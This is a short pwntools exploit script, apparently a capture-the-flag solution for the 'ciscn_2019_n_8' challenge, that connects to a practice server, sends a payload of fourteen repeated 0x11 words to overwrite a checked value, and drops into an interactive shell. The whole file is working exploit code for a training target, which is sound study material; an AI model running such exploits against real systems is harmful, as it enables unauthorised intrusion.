from pwn import *

elf = ELF("./ciscn_2019_n_8")
#io  = remote("192.168.95.131",10001)
io  = remote("node4.buuoj.cn",29247)

pause()

print(io.recvuntil(b"What's your name?"))

payload=p32(0x11)*14
pause()
io.sendline(payload)

print(io.recv())
io.interactive()

pause()